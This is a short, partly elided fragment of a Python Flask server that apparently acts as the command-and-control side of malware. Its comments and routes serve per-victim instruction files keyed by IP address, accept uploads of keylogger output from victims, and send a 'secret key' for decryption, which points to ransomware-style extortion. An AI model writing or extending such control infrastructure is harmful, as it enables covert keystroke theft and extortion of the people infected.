...
if __name__ == "__main__":
    ...
    # routes for victim to fetch their instructions
    @app.route("/<victim_ip>", methods=["GET"])
    def serve_file(victim_ip):
        try:
            return send_from_directory(
                ".", f"{FILE_TO_SERVE[:-4]}_{format_ip(victim_ip)}.txt"
            )
        except FileNotFoundError:
            return "File not found", 404

    # clear the instruction file after victim fetchs it
    ...
    # route for victim to upload keylogger output
    ...
    # send to the victim the secret key de decrypt
    @app.route("/send_secret_key")
    def send_secret_key():
        return send_file(SECRET_KEY, as_attachment=True)

    # route to send .mp4 file to victim
